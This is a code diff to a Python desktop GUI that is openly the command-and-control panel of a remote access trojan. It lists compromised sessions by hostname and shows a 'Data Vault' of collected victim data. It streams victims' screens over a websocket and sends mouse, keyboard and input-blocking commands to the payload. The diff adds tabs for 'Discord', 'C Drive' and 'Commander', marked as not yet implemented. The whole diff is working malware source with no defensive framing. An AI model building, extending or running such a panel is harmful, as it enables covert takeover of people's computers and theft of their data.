@@ -60,37 +60,30 @@ class App(ctk.CTk):
         ctk.CTkLabel(header_frame, text=session_data.get('hostname', 'N/A'), font=ctk.CTkFont(size=16, weight="bold")).pack(side="left", padx=20)
         
         master_tab_view = ctk.CTkTabview(self.session_detail_frame); master_tab_view.grid(row=1, column=0, sticky="nsew")
-        tab_names = ["Remote Desktop", "Live Actions", "Data Vault"]
+        tab_names = ["Remote Desktop", "Live Actions", "Data Vault", "Discord", "C Drive", "Process Manager", "Commander", "Events"]
         for name in tab_names: master_tab_view.add(name)
         master_tab_view.set("Remote Desktop")
 
+        # --- THIS IS THE FIX: Call all the populate functions ---
         self.populate_rat_tab(master_tab_view.tab("Remote Desktop"), session_id)
         self.populate_live_actions_tab(master_tab_view.tab("Live Actions"), session_id)
         self.populate_data_vault_tab(master_tab_view.tab("Data Vault"), session_data)
+        for name in tab_names[3:]: # Start from the 4th tab now
+            ctk.CTkLabel(master_tab_view.tab(name), text=f"'{name}' functionality not yet implemented.").pack(expand=True)
+        # --------------------------------------------------------
 
     def populate_rat_tab(self, tab, session_id):
         tab.grid_columnconfigure(0, weight=1); tab.grid_rowconfigure(1, weight=1)
-        
-        # --- Controls Frame ---
         controls_frame = ctk.CTkFrame(tab); controls_frame.grid(row=0, column=0, sticky="ew", padx=5, pady=5)
-        start_button = ctk.CTkButton(controls_frame, text="Start Session", command=lambda: self.start_rat_session(session_id))
-        start_button.pack(side="left", padx=5, pady=5)
-        stop_button = ctk.CTkButton(controls_frame, text="Stop Session", command=self.stop_rat_session)
-        stop_button.pack(side="left", padx=5, pady=5)
-        block_input_button = ctk.CTkButton(controls_frame, text="Block Input (5s)", command=lambda: self.send_rat_command({"action": "block_input"}))
-        block_input_button.pack(side="left", padx=5, pady=5)
-
-        # --- Screen Viewer ---
-        self.rat_screen_label = ctk.CTkLabel(tab, text="Session is stopped. Click 'Start Session'.", corner_radius=5)
-        self.rat_screen_label.grid(row=1, column=0, sticky="nsew", padx=5, pady=5)
-
-        # Bind mouse/keyboard events
+        ctk.CTkButton(controls_frame, text="Start Session", command=lambda: self.start_rat_session(session_id)).pack(side="left", padx=5, pady=5)
+        ctk.CTkButton(controls_frame, text="Stop Session", command=self.stop_rat_session).pack(side="left", padx=5, pady=5)
+        ctk.CTkButton(controls_frame, text="Block Input (5s)", command=lambda: self.send_rat_command({"action": "block_input"})).pack(side="left", padx=5, pady=5)
+        self.rat_screen_label = ctk.CTkLabel(tab, text="Session is stopped. Click 'Start Session'.", corner_radius=5); self.rat_screen_label.grid(row=1, column=0, sticky="nsew", padx=5, pady=5)
         self.rat_screen_label.bind("<Motion>", self.handle_mouse_move)
         self.rat_screen_label.bind("<Button-1>", self.handle_mouse_click)
-        self.master.bind("<KeyPress>", self.handle_key_press) # Bind to master window
+        self.master.bind("<KeyPress>", self.handle_key_press)
 
     def populate_live_actions_tab(self, tab, session_id):
-        # ... (This function is the same as the previous version) ...
         tab.grid_columnconfigure(0, weight=1)
         popup_frame = ctk.CTkFrame(tab); popup_frame.pack(fill="x", padx=10, pady=10)
         popup_frame.grid_columnconfigure(1, weight=1)
@@ -99,7 +92,6 @@ class App(ctk.CTk):
         popup_button = ctk.CTkButton(popup_frame, text="Show Popup", command=lambda: self.send_popup_task(session_id, popup_entry.get())); popup_button.grid(row=0, column=2, padx=5, pady=5)
 
     def populate_data_vault_tab(self, tab, session_data):
-        # ... (This function is the same as the previous version) ...
         tab.grid_columnconfigure(1, weight=1); tab.grid_rowconfigure(0, weight=1)
         tab_panel = ctk.CTkScrollableFrame(tab, width=200, corner_radius=0); tab_panel.grid(row=0, column=0, sticky="nsw", padx=(0, 5))
         content_panel = ctk.CTkFrame(tab, corner_radius=0, fg_color="transparent"); content_panel.grid(row=0, column=1, sticky="nsew")
@@ -116,20 +108,16 @@ class App(ctk.CTk):
             self.update_content_view(list(self.detail_view_data_map.keys())[0])
 
     def update_content_view(self, selected_title):
-        # ... (This function is the same as the previous version) ...
         content = self.detail_view_data_map.get(selected_title, "Content not found.")
         self.detail_view_content_textbox.configure(state="normal")
         self.detail_view_content_textbox.delete("0.0", "end"); self.detail_view_content_textbox.insert("0.0", content)
         self.detail_view_content_textbox.configure(state="disabled")
         for title, button in self.detail_view_tab_buttons.items(): button.configure(fg_color="gray20" if title == selected_title else "transparent")
 
-    # --- RAT Session Methods ---
     def start_rat_session(self, session_id):
         if self.rat_active: self.stop_rat_session()
         self.rat_active = True
-        # 1. Send HTTP task to tell payload to connect
         self.send_task_to_session(session_id, "start_rat")
-        # 2. Start the asyncio event loop in a new thread
         self.async_loop = asyncio.new_event_loop()
         threading.Thread(target=self.run_async_loop, daemon=True).start()
 
@@ -141,6 +129,7 @@ class App(ctk.CTk):
         ws_url = f"{WS_SERVER_URL}/ws/rat/{self.active_session_id}"
         headers = {'X-Client-Type': 'c2'}
         try:
+            # The 'extra_headers' argument is now supported by websockets v8.1
             async with websockets.connect(ws_url, extra_headers=headers) as self.rat_ws:
                 self.rat_screen_label.configure(text="Connected. Waiting for first frame...")
                 async for message in self.rat_ws:
@@ -151,33 +140,25 @@ class App(ctk.CTk):
 
     def stop_rat_session(self):
         self.rat_active = False
-        if self.rat_ws:
+        if hasattr(self, 'rat_ws') and self.rat_ws:
             asyncio.run_coroutine_threadsafe(self.rat_ws.close(), self.async_loop)
         self.rat_screen_label.configure(text="Session stopped.")
 
     def update_rat_screen(self, frame_data):
         try:
-            img = Image.open(io.BytesIO(frame_data))
-            self.rat_image_tk = ImageTk.PhotoImage(img)
+            img = Image.open(io.BytesIO(frame_data)); self.rat_image_tk = ImageTk.PhotoImage(img)
             self.rat_screen_label.configure(image=self.rat_image_tk, text="")
-        except Exception: pass # Ignore corrupted frames
+        except Exception: pass
 
     def send_rat_command(self, command_dict):
-        if self.rat_active and self.rat_ws:
+        if self.rat_active and hasattr(self, 'rat_ws') and self.rat_ws:
             asyncio.run_coroutine_threadsafe(self.rat_ws.send(json.dumps(command_dict)), self.async_loop)
 
-    def handle_mouse_move(self, event):
-        # This needs scaling if we implement resolution scaling
-        self.send_rat_command({"action": "mouse_move", "x": event.x, "y": event.y})
-
-    def handle_mouse_click(self, event):
-        self.send_rat_command({"action": "mouse_click"})
-        
+    def handle_mouse_move(self, event): self.send_rat_command({"action": "mouse_move", "x": event.x, "y": event.y})
+    def handle_mouse_click(self, event): self.send_rat_command({"action": "mouse_click"})
     def handle_key_press(self, event):
-        if self.rat_active: # Only capture keys if RAT is active
-            self.send_rat_command({"action": "key_press", "key": event.keysym})
-
-    # ... (Rest of the unchanged methods from previous version) ...
+        if self.rat_active: self.send_rat_command({"action": "key_press", "key": event.keysym})
+        
     def send_popup_task(self, session_id, text):
         if not text: messagebox.showwarning("Warning", "Popup text cannot be empty."); return
         self.send_task_to_session(session_id, "show_popup", {"text": text}, show_info=True)
@@ -218,7 +199,8 @@ class App(ctk.CTk):
     def add_session_widgets(self, session_id, hostname):
         container_frame = ctk.CTkFrame(self.sessions_frame, fg_color="transparent"); container_frame.pack(fill="x", padx=5, pady=2); container_frame.grid_columnconfigure(0, weight=1)
         session_button = ctk.CTkButton(container_frame, text=f"  {hostname}  |  {session_id[:8]}...  ", command=lambda sid=session_id: self.show_session_data(sid)); session_button.grid(row=0, column=0, sticky="ew", padx=(0, 5))
-        delete_button = cтk.CTkButton(container_frame, text="X", width=30, fg_color="firebrick", hover_color="darkred", command=lambda sid=session_id: self.delete_session_handler(sid)); delete_button.grid(row=0, column=1, sticky="e")
+        # --- THIS IS THE TYPO FIX ---
+        delete_button = ctk.CTkButton(container_frame, text="X", width=30, fg_color="firebrick", hover_color="darkred", command=lambda sid=session_id: self.delete_session_handler(sid)); delete_button.grid(row=0, column=1, sticky="e")
         self.session_widgets[session_id] = {"frame": container_frame, "button": session_button}
     def delete_session_handler(self, session_id):
         hostname = self.sessions.get(session_id, {}).get("hostname", session_id[:8])
